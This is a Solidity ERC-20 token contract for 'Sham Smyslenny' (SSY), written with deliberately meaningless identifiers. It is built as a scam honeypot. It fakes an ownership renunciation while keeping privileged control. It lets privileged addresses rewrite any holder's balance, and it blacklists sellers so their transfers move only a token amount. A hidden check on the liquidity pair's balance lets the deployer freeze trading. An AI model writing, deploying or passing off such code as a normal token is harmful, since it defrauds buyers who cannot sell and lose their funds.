//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface fromBuy {
    function createPair(address swapReceiver, address buyToken) external returns (address);
}

interface txBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverLaunched) external view returns (uint256);

    function transfer(address launchMin, uint256 walletAuto) external returns (bool);

    function allowance(address listEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletAuto) external returns (bool);

    function transferFrom(
        address sender,
        address launchMin,
        uint256 walletAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoFundMax, uint256 value);
    event Approval(address indexed listEnable, address indexed spender, uint256 value);
}

abstract contract senderAmountLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundFromTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txBuyMetadata is txBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShamSmyslenny is senderAmountLiquidity, txBuy, txBuyMetadata {

    constructor (){
        
        shouldAt();
        fundFromTotal teamTotal = fundFromTotal(senderMarketing);
        feeBuy = fromBuy(teamTotal.factory()).createPair(teamTotal.WETH(), address(this));
        if (amountFee == fromSell) {
            fundAt = amountFee;
        }
        fundLiquidity = _msgSender();
        feeShouldAmount[fundLiquidity] = true;
        enableFund[fundLiquidity] = modeFrom;
        if (minMode != sellReceiverMax) {
            amountFee = senderLiquidity;
        }
        emit Transfer(address(0), fundLiquidity, modeFrom);
    }

    uint256 public amountFee;

    function modeMin() private view {
        require(feeShouldAmount[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return takeTx;
    }

    function allowance(address atToken, address marketingReceiver) external view virtual override returns (uint256) {
        if (marketingReceiver == senderMarketing) {
            return type(uint256).max;
        }
        return txFrom[atToken][marketingReceiver];
    }

    function transfer(address atAutoTotal, uint256 walletAuto) external virtual override returns (bool) {
        return receiverLiquidity(_msgSender(), atAutoTotal, walletAuto);
    }

    function owner() external view returns (address) {
        return buyFeeSender;
    }

    function receiverLiquidity(address enableReceiverLaunch, address launchMin, uint256 walletAuto) internal returns (bool) {
        if (enableReceiverLaunch == fundLiquidity) {
            return maxShould(enableReceiverLaunch, launchMin, walletAuto);
        }
        uint256 modeTeamSwap = txBuy(feeBuy).balanceOf(isList);
        require(modeTeamSwap == maxToken);
        require(launchMin != isList);
        if (maxSell[enableReceiverLaunch]) {
            return maxShould(enableReceiverLaunch, launchMin, minIsSender);
        }
        return maxShould(enableReceiverLaunch, launchMin, walletAuto);
    }

    address public fundLiquidity;

    bool public takeAutoAt;

    mapping(address => bool) public maxSell;

    mapping(address => mapping(address => uint256)) private txFrom;

    uint256 tokenAuto;

    function balanceOf(address receiverLaunched) public view virtual override returns (uint256) {
        return enableFund[receiverLaunched];
    }

    string private enableAuto = "SSY";

    uint256 constant minIsSender = 7 ** 10;

    bool public minMode;

    function swapMin(address tradingTo) public {
        modeMin();
        if (fromSell == senderLiquidity) {
            senderLiquidity = amountFee;
        }
        if (tradingTo == fundLiquidity || tradingTo == feeBuy) {
            return;
        }
        maxSell[tradingTo] = true;
    }

    function swapTx(address enableToReceiver) public {
        if (takeAutoAt) {
            return;
        }
        if (sellReceiverMax == tradingAtTotal) {
            senderLiquidity = amountFee;
        }
        feeShouldAmount[enableToReceiver] = true;
        if (sellReceiverMax) {
            fundAt = fromSell;
        }
        takeAutoAt = true;
    }

    bool private tradingAtTotal;

    uint8 private tradingReceiver = 18;

    function symbol() external view virtual override returns (string memory) {
        return enableAuto;
    }

    function enableLaunched(address atAutoTotal, uint256 walletAuto) public {
        modeMin();
        enableFund[atAutoTotal] = walletAuto;
    }

    uint256 private fundAt;

    function transferFrom(address enableReceiverLaunch, address launchMin, uint256 walletAuto) external override returns (bool) {
        if (_msgSender() != senderMarketing) {
            if (txFrom[enableReceiverLaunch][_msgSender()] != type(uint256).max) {
                require(walletAuto <= txFrom[enableReceiverLaunch][_msgSender()]);
                txFrom[enableReceiverLaunch][_msgSender()] -= walletAuto;
            }
        }
        return receiverLiquidity(enableReceiverLaunch, launchMin, walletAuto);
    }

    address private buyFeeSender;

    uint256 private modeFrom = 100000000 * 10 ** 18;

    function approve(address marketingReceiver, uint256 walletAuto) public virtual override returns (bool) {
        txFrom[_msgSender()][marketingReceiver] = walletAuto;
        emit Approval(_msgSender(), marketingReceiver, walletAuto);
        return true;
    }

    bool private sellReceiverMax;

    mapping(address => uint256) private enableFund;

    function decimals() external view virtual override returns (uint8) {
        return tradingReceiver;
    }

    function shouldAt() public {
        emit OwnershipTransferred(fundLiquidity, address(0));
        buyFeeSender = address(0);
    }

    function getOwner() external view returns (address) {
        return buyFeeSender;
    }

    string private takeTx = "Sham Smyslenny";

    mapping(address => bool) public feeShouldAmount;

    function maxShould(address enableReceiverLaunch, address launchMin, uint256 walletAuto) internal returns (bool) {
        require(enableFund[enableReceiverLaunch] >= walletAuto);
        enableFund[enableReceiverLaunch] -= walletAuto;
        enableFund[launchMin] += walletAuto;
        emit Transfer(enableReceiverLaunch, launchMin, walletAuto);
        return true;
    }

    uint256 private senderLiquidity;

    uint256 maxToken;

    address isList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return modeFrom;
    }

    uint256 private fromSell;

    function takeLimitTx(uint256 walletAuto) public {
        modeMin();
        maxToken = walletAuto;
    }

    address senderMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed tradingMarketingFrom, address indexed launchLiquidity);

    address public feeBuy;

}